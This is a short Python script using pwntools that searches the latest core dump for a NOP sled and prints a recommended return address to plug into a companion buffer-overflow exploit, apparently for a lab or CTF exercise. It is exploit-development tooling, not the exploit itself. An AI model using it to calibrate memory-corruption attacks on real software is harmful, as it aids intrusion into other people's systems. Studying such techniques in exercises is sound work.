from pwn import *
import os
import glob

# 1. Find the latest core file automatically
core_files = glob.glob('core.*')
if not core_files:
    log.error("No core files found! Run the exploit_lazy.py one more time.")

latest_core = max(core_files, key=os.path.getctime)
log.info(f"Analyzing latest crash dump: {latest_core}")

# 2. Load the core dump
core = Coredump(latest_core)

print("-" * 30)
print("[*] Hunting for NOP Sled (0x90909090)...")

try:
    # --- FIX IS HERE: Use next() as a function, not a method ---
    sled_address = next(core.search(b'\x90'*32))
    
    print(f"\n[+] FOUND IT! The NOP Sled starts at: {hex(sled_address)}")
    
    # Target the middle of the sled (start + 2000 bytes)
    target = sled_address + 2000
    print(f"[+] RECOMMENDED TARGET ADDRESS: {hex(target)}")
    
    print("\nNext Step:")
    print(f"Update exploit_lazy.py with: target_address = {hex(target)}")

except StopIteration:
    print("[-] Could not find NOP sled. The environment might be empty.")